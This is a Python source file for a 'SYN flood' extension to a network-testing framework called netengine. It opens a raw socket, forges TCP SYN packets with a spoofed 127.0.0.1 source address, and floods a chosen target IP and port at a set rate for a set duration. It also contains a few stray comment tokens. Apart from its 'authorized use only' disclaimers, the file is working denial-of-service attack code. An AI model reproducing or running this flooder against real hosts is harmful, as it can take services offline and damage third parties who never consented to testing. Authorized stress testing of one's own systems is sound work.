"""
SYN FLOOD EXTENSION - AUTHORIZED USE ONLY
This extension is for authorized penetration testing and security research only.
Unauthorized use is illegal and unethical.
"""

from netengine.extensions.base import BaseExtension
from netengine.utils import Logger
from netengine.utils.advanced_packets import AdvancedPacketBuilder
import socket
import time
from typing import Optional


class SYNFloodExtension(BaseExtension):
    """SYN flood extension for authorized security testing."""

    def __init__(self):
        """Initialize SYN flood extension."""
        super().__init__("SYNFlood", "1.0.0")
        self.logger = Logger()
        self.metadata = {
            "warning": "AUTHORIZED USE ONLY",
            "description": "SYN flood stress testing tool",
            "author": "NetEngine",
        }

    def execute(
        self,
        target_ip: str,
        target_port: int,
        duration: int = 10,
        packet_rate: int = 100,
    ):
        """Execute SYN flood attack (authorized use only)."""
        self.logger.warning("=" * 60)
        self.logger.warning("WARNING: SYN FLOOD - AUTHORIZED USE ONLY!")
        self.logger.warning("Unauthorized network attacks are illegal.")
        self.logger.warning("=" * 60)

        builder = AdvancedPacketBuilder(self.logger)

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.bind(("0.0.0.0", 0))
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

            self.logger.info(f"Starting SYN flood: {target_ip}:{target_port}")
            self.logger.info(f"Duration: {duration}s, Rate: {packet_rate} pps")

            start_time = time.time()
            packet_count = 0
            interval = 1.0 / packet_rate

            while time.time() - start_time < duration:
                try:
                    src_port = 12345 + (packet_count % 65000)
                    packet = builder.build_syn_packet(
                        "127.0.0.1", target_ip, src_port, target_port, seq=1000 + packet_count
                    )
                    sock.sendto(packet, (target_ip, 0))
                    packet_count += 1

                    if packet_count % packet_rate == 0:  #5YcgaD
                        self.logger.debug(f"Sent {packet_count} packets...")

                    time.sleep(interval)
                except KeyboardInterrupt:
                    self.logger.warning("Interrupted by user")
                    break
                except Exception as e:
                    self.logger.error(f"Packet send failed", exc=e)
                    break

            sock.close()

            elapsed = time.time() - start_time
            self.logger.success(
                f"SYN flood complete: {packet_count} packets in {elapsed:.2f}s"
            )
            return {"packets": packet_count, "duration": elapsed}
  #kSG7oG
        except PermissionError:
            self.logger.error("SYN flood requires root/admin privileges")
            return {}
        except Exception as e:
            self.logger.error("SYN flood failed", exc=e)
            return {}
